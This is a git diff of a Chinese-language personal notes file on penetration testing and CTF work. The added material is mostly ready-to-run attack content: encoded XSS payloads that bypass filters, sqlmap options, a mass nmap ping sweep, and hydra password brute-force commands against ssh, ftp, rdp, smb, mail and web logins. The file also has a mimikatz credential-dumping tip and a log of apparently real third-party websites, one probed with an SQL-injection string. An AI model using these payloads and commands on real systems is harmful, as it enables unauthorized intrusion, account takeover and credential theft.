@@ -5,9 +5,57 @@ tags:  笔记
 abstract: 我听过的会忘掉，我看过的能记住，我做过的才真正明白。
 ---
 
+渗透测试实际上就是信息收集，CTF 更是如此，所以一定要沉得住气，
 
+慢慢收集，更不能思维定势，做出一道题最大的成就感在于收获到了新知识、新姿势。
+
+打开脑洞，胆大心细。
 
 ## 每天学点新东西
+
+很多人会忘记 127.0.0.0/8 ，认为本地地址就是 127.0.0.1 ，实际上本地回环包括了整个127段。你可以访问`http://127.233.233.233/`，会发现和请求127.0.0.1是一个结果
+
+
+
+#### [超赞网络资源总结](https://www.cnblogs.com/iamstudy/p/document_write_1.html)
+
+挺多不错的东西，点点散散记到笔记就不知道跑哪去了。
+
+代码审计
+1、全面总结
+<https://find-sec-bugs.github.io/>
+
+2、python安全
+<https://github.com/bit4woo/python_sec>
+
+------
+
+内网渗透
+1、内网渗透攻防总结
+<https://github.com/infosecn1nja/AD-Attack-Defense>
+
+2、红队
+<https://github.com/yeyintminthuhtut/Awesome-Red-Teaming>
+<https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki>
+
+------
+
+Tools
+1、payload fuzz
+<https://github.com/swisskyrepo/PayloadsAllTheThings>
+
+2、payload + user pass (针对国外)
+<https://github.com/fuzzdb-project/fuzzdb/>
+
+------
+
+案例
+1、赏金猎人漏洞案例
+<https://github.com/ngalongc/bug-bounty-reference>
+
+know it then do it
+
+
 
 `ph` 师傅的 来自小密圈的那些奇技淫巧
 
@@ -87,8 +135,6 @@ if(!in_array(pathinfo($log_name, PATHINFO_EXTENSION),
 
 
 
-如果拿到了管理员 `cookie`，可通过 `window.location.href` 拿到后台 `URL`
-
 win-server 拿到权限后可通过 `mimikatz` 获得管理员密码
 
 GitHub ：webdirscan weakfilescan bbscan
@@ -136,7 +182,7 @@ Python
 	Flask
 
 Ruby
-	ruby on rails
+	rails
 
 Nodejs
 	Express / Koa
@@ -270,20 +316,10 @@ alter table table_name;
 update table_name set column_name='new' where id=1;  -- 更新
 /*!50000select*/
 where id = 0.1 union select ...
-xor, ||, &&, !, not
+xor, ||, &&, !, not，<>
 ```
 
-常用语句
 
-```sql
-or 1=1--+
-'or 1=1--+
-"or 1=1--+
-)or 1=1--+
-')or 1=1--+
-") or 1=1--+
-"))or 1=1--+
-```
 
 ### 类型
 
@@ -560,6 +596,30 @@ sqlmap 中`--file-read`参数，可以读取服务器端任意文件
 
 ```shell
 python sqlmap -u "127.0.0.1/index.php?id=1 %df'" --file-read="./index.php"
+```
+
+```
+-u 单个URL -m xx.txt 多个URL
+-d "mysql://user:password@10.10.10.137:3306/dvwa"  作为服务器客户端，直接连接数据库
+--data post/get都适用
+-p 指定扫描的参数
+-r 读取文件
+-f 指纹信息
+--tamper 混淆脚本，用于应用层过滤
+--cookie --user-agent --host等等http头的修改
+--threads 并发线程 默认为1
+--dbms MySQL<5.0> 指定数据库或版本
+
+–level=LEVEL 执行测试的等级（1-5，默认为 1）
+–risk=RISK 执行测试的风险（0-3，默认为 1） Risk升高可造成数据被篡改等风险
+–current-db / 获取当前数据库名称
+–dbs 枚举数据库管理系统数据库
+–tables 枚举 DBMS 数据库中的表
+–columns 枚举 DBMS 数据库表列
+-D DB 要进行枚举的数据库名
+-T TBL 要进行枚举的数据库表
+-C COL 要进行枚举的数据库列
+-U USER 用来进行枚举的数据库用户
 ```
 
 确定字段数：order by n，select 1,2,…,n
@@ -1263,11 +1323,115 @@ JS提供了四种字符编码的策略，
 
 ### 杂项
 
+##### 过滤空格
+
+用`/`代替空格
+
+```html
+<img/src="x"/onerror=alert("xss");>
+```
+
+#### 过滤关键字
+
+##### 大小写绕过
+
+```html
+<ImG sRc=x onerRor=alert("xss");>
+```
+
+##### 双写关键字
+
+有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过
+
+```html
+<imimgg srsrcc=x onerror=alert("xss");>
+```
+
+##### 字符拼接
+
+利用eval
+
+```html
+<img src="x" onerror="a=`aler`;b=`t`;c='(`xss`);';eval(a+b+c)">
+```
+
+利用top
+
+```html
+<script>top["al"+"ert"](`xss`);</script>
+```
+
+##### 其它字符混淆
+
+有的waf可能是用正则表达式去检测是否有xss攻击，如果我们能fuzz出正则的规则，则我们就可以使用其它字符去混淆我们注入的代码了
+下面举几个简单的例子
+
+```html
+可利用注释、标签的优先级等
+1.<<script>alert("xss");//<</script>
+2.<title><img src=</title>><img src=x onerror="alert(`xss`);"> //因为title标签的优先级比img的高，所以会先闭合title，从而导致前面的img标签无效
+3.<SCRIPT>var a="\\";alert("xss");//";</SCRIPT>
+```
+
+##### 编码绕过
+
+Unicode编码绕过
+
+```html
+<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#120;&#115;&#115;&#34;&#41;&#59;">
+
+<img src="x" onerror="eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b')">
+```
+
+url编码绕过
+
+```html
+<img src="x" onerror="eval(unescape('%61%6c%65%72%74%28%22%78%73%73%22%29%3b'))">
+<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
+```
+
+Ascii码绕过
+
+```html
+<img src="x" onerror="eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))">
+```
+
+hex绕过
+
+```html
+<img src=x onerror=eval('\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29')>
+```
+
+八进制
+
+```html
+<img src=x onerror=alert('\170\163\163')>
+```
+
+base64绕过
+
+```html
+<img src="x" onerror="eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw=='))">
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">
+```
+
+##### 过滤双引号，单引号
+
+1.如果是html标签中，我们可以不用引号。如果是在js中，我们可以用反引号代替单双引号
+
+```html
+<img src="x" onerror=alert(`xss`);>
+```
+
+2.使用编码绕过，具体看上面我列举的例子，我就不多赘述了
+
+
+
 #### 过滤url地址
 
 **使用url编码**
 
-```
+```html
 <img src="x" onerror=document.location=`http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/`>
 ```
 
@@ -1275,31 +1439,31 @@ JS提供了四种字符编码的策略，
 
 1.十进制IP
 
-```
+```html
 <img src="x" onerror=document.location=`http://2130706433/`>
 ```
 
 2.八进制IP
 
-```
+```html
 <img src="x" onerror=document.location=`http://0177.0.0.01/`>
 ```
 
 3.hex
 
-```
+```html
 <img src="x" onerror=document.location=`http://0x7f.0x0.0x0.0x1/`>
 ```
 
 4.html标签中用`//`可以代替`http://`
 
-```
+```html
 <img src="x" onerror=document.location=`//www.baidu.com`>
 ```
 
 5.使用`\\`
 
-```
+```html
 但是要注意在windows下\本身就有特殊用途，是一个path 的写法，所以\\在Windows下是file协议，在linux下才会是当前域的协议
 ```
 
@@ -1313,7 +1477,7 @@ JS提供了四种字符编码的策略，
 
 **PS：在无CSP的情况下才可以**
 
-```
+```html
 <link rel=import href="http://127.0.0.1/1.js">
 ```
 
@@ -1336,7 +1500,7 @@ alert`1`
 
 没了引号
 
-```
+```html
 <script>alert(/adkddfasdffaasdfa/)</script>
 ```
 
@@ -1628,7 +1792,7 @@ function escape(input) {
 p'rompt(1)
 ```
 
-#### 11
+#### 11. 
 
 ```javascript
 function escape(input) {
@@ -1672,7 +1836,14 @@ function escape(input) {
 ```
 
 ```javascript
-
+encodeURIComponent() 不会对 ASCII 字母和数字进行编码，
+也不会对这些 ASCII 标点符号进行编码： - _ . ! ~ * ' ( ) 。
+尝试使用 String.fromCharCode(112, 114, 111, 109, 112, 116)，但是 , 被编码
+.() 不会被编码，所以可以利用 toString() 构造
+toString(radix)中radix 为 2-36 可以选36使其作为一个进制，将字符包含起来
+使用parseInt(str, radix) 将字符转为数字之后使用(number).toString(radix) 然后用eval进行调用 注意number有括号，(number).toString(radix) 可简写为 （numbrer..toString(radix) ，字符之间用concat()连接
+看wp之后发现有个 parseInt()
+parseInt('prompt', 36) //1558153217
 ```
 
 #### 13
@@ -2320,56 +2491,6 @@ start attack  # 观察状态码和长度
 
 ##### 突破文件上传
 
-+ 分析 medium 级别代码
-
-```php
-<?php
-if( isset( $_POST[ 'Upload' ] ) ) {
-        // Where are we going to be writing to?
-        $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
-        $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );
-
-        // File information
-        $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
-        $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];
-        $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];
-
-        // Is it an image?
-        if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) &&
-                ( $uploaded_size < 100000 ) ) {
-
-                // Can we move the file to the upload folder?
-                if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], 						$target_path ) ) {
-                        // No
-                        $html .= '<pre>Your image was not uploaded.</pre>';
-                }
-                else {
-                        // Yes!
-                        $html .= "<pre>{$target_path} succesfully uploaded!</pre>";
-                }
-        }
-        else {
-                // Invalid file
-                $html .= '<pre>Your image was not uploaded. We can only accept JPEG 				or PNG images.</pre>';
-        }
-}
-```
-
-这里分别通过`$_FILES['uploaded']['type']`和`$_FILES['uploaded']['size']`获取了上传文件的 MIME类型和文件大小。
-
-MIME类型用来设定某种扩展名文件的打开方式，当具有该扩展名的文件被访问时，浏览器会自动使用指定的应用程序来打开，如jpg图片的MIME为`image/jpeg`。
-
-因而medium与low的主要区别就是对文件的MIME类型和文件大小进行了判断，这样就只允许上传jpg格式的图片文件。
-
-`../`即为上级目录
-
-+ **用 Burp 抓包改下 `Content-Type` 为 `image/jpeg`**，上传成功
-
-+ 上传正常文件，拦截上传内容，将代码从请求头插进去
-
-+ 文件包含
-
-
 ##### 数据获取测试
 
 ### sqlmap
@@ -2675,6 +2796,35 @@ class DBMS:
 ### nosqlmap
 
 ### nmap
+
+急速扫描大量主机，为什么要扫描大网络空间呢？ 有这样的情形：
+
+1. 内网渗透   攻击者单点突破，进入内网后，需进一步扩大成果，可以先扫描整个私有网络空间，发现哪些主机是有利用价值的，例如10.1.1.1/8, 172.16.1.1/12, 192.168.1.1/16
+2. 全网扫描
+
+扫描一个巨大的网络空间，我们最关心的是效率问题，即时间成本。 在足够迅速的前提下，宁可牺牲掉一些准确性。
+
+扫描的基本思路是高并发地ping：
+
+```
+`nmap -``v` `-sn -PE -n --min-hostgroup 1024 --min-parallelism 1024 -oX nmap_output.xml www.hackliu.com``/16`
+```
+
+-sn    不扫描端口，只ping主机
+
+-PE   通过ICMP echo判定主机是否存活
+
+-n     不反向解析IP地址到域名
+
+–min-hostgroup 1024    最小分组设置为1024个IP地址，当IP太多时，nmap需要分组，然后串行扫描
+
+–min-parallelism 1024  这个参数非常关键，为了充分利用系统和网络资源，我们将探针的数目限定最小为1024
+
+-oX nmap_output.xml    将结果以XML格式输出，文件名为nmap_output.xml
+
+一旦扫描结束，解析XML文档即可得到哪些IP地址是存活的。
+
+我测试扫描www.hackliu.com/16这B段，65535个IP地址（存活10156），耗时112.03秒
 
 #### 一、主机发现
 
@@ -3268,7 +3418,7 @@ masscan -p5070 172.16.5.0/24
 
 ```
 hydra <参数> <IP地址> <服务名>  
-hydra的一些参数:  
+
 -R 继续从上一次的进度开始爆破  
 -s <port> 指定端口  
 -l <username> 指定登录的用户名  
@@ -3279,10 +3429,52 @@ hydra的一些参数:
 -v 显示详细过程  
 ```
 
-实例 爆破 ssh 登录密码
+实例
 
 ```shell
+1、破解ssh： 
+hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip ssh 
+hydra -l 用户名 -p 密码字典 -t 线程 -o save.log -vV ip ssh 
 hydra -l root -P /tmp/pass.txt -t 4 -v 192.168.57.101 ssh
+
+2、破解ftp： 
+hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV 
+hydra ip ftp -l 用户名 -P 密码字典 -e ns -vV 
+
+3、get方式提交，破解web登录： 
+hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get /admin/ 
+hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get /admin/index.php
+
+4、post方式提交，破解web登录： 
+hydra -l 用户名 -P 密码字典 -s 80 ip http-post-form "/admin/login.php:username=^USER^&password=^PASS^&submit=login:sorry password" 
+hydra -t 3 -l admin -P pass.txt -o out.txt -f 10.36.16.18 http-post-form "login.php:id=^USER^&passwd=^PASS^:<title>wrong username or password</title>" 
+（参数说明：-t同时线程数3，-l用户名是admin，字典pass.txt，保存为out.txt，-f 当破解了一个密码就停止， 10.36.16.18目标ip，http-post-form表示破解是采用http的post方式提交的表单密码破解,<title>中 的内容是表示错误猜解的返回信息提示。） 
+
+5、破解https： 
+hydra -m /index.php -l muts -P pass.txt 10.36.16.18 https 
+
+6、破解teamspeak： 
+hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak 
+
+7、破解cisco： 
+hydra -P pass.txt 10.36.16.18 cisco 
+hydra -m cloud -P pass.txt 10.36.16.18 cisco-enable 
+
+8、破解smb： 
+hydra -l administrator -P pass.txt 10.36.16.18 smb 
+
+9、破解pop3： 
+hydra -l muts -P pass.txt my.pop3.mail pop3 
+
+10、破解rdp： 
+hydra ip rdp -l administrator -P pass.txt -V 
+
+11、破解http-proxy： 
+hydra -l admin -P pass.txt http-proxy://10.36.16.18 
+
+12、破解imap： 
+hydra -L user.txt -p secret 10.36.16.18 imap PLAIN 
+hydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN
 ```
 
 ## 思路
@@ -3339,8 +3531,6 @@ hydra -l root -P /tmp/pass.txt -t 4 -v 192.168.57.101 ssh
 ## 日站记录
 
 http://2nto4x.ijhz.cn/luodi/xiaoshuo/?pageid=20%20and%201=0
-
-
 
 https://market.hzhangmeng.com/landingPage/register-keledai.html?owner=keledai&channelCode=azuo    
 
